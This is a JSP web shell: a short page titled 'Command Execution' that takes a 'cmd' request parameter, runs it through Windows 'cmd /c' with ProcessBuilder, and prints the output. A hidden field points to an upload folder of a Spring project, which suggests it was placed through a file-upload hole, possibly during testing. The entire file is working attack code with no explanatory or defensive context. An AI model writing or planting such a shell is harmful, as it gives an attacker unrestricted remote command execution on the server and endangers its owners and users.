<%@ page import="java.io.*" %>
    <%@ page import="java.util.Base64" %>
        <html>

        <head>
            <title>Command Execution</title>
            <meta charset="UTF-8">
        </head>

        <body>
            <form method="GET">
                <input type="hidden" name="filePath"
                    value="C:/Users/sehun/piggybank/piggybank-spring/upload/4edf3634-979a-4f90-9ae5-09d0cfa81748/cmd.jsp">
                <input type="text" name="cmd" size="50">
                <input type="submit" value="Execute">
            </form>
            <pre>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null && !cmd.isEmpty()) {
        try {
            ProcessBuilder pb = new ProcessBuilder("cmd", "/c", cmd);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "MS949"));
            String line;
            while ((line = br.readLine()) != null) {
                out.println(line);
            }
            br.close();
        } catch (Exception e) {
            out.println("Error: " + e.getMessage());
        }
    }
%>
    </pre>
        </body>

        </html>